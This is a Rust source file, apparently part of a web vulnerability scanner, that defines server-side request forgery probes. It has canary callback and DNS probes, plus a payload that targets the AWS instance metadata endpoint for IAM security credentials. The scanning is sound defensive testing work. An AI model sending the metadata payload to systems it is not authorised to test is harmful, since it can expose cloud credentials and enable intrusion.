use super::{OracleKind, Probe, ProbeRisk, ProbeTemplate};
use uuid::Uuid;

pub fn template(canary_host: &str) -> ProbeTemplate {
    ProbeTemplate {
        category: "ssrf",
        baseline_payload: "https://example.com",
        probes: vec![
            Probe {
                id: {
                    let id = Uuid::new_v4().to_string();
                    id
                },
                payload: format!("http://{canary_host}/frensense-probe"),
                oracle: OracleKind::CanaryCallback {
                    probe_id: "ssrf_callback".to_string(),
                },
                risk: ProbeRisk::Safe,
                description: "SSRF callback to canary server — inbound connection confirms fetch"
                    .to_string(),
            },
            Probe {
                id: Uuid::new_v4().to_string(),
                payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                    .to_string(),
                oracle: OracleKind::CanaryInBody {
                    canary: "iam".to_string(),
                },
                risk: ProbeRisk::Safe,
                description:
                    "AWS metadata endpoint — response body confirms internal network access"
                        .to_string(),
            },
            Probe {
                id: Uuid::new_v4().to_string(),
                payload: format!("http://ssrf.{canary_host}"),
                oracle: OracleKind::CanaryCallback {
                    probe_id: "ssrf_dns".to_string(),
                },
                risk: ProbeRisk::Safe,
                description: "SSRF via DNS lookup — canary DNS resolution confirms fetch attempt"
                    .to_string(),
            },
        ],
    }
}
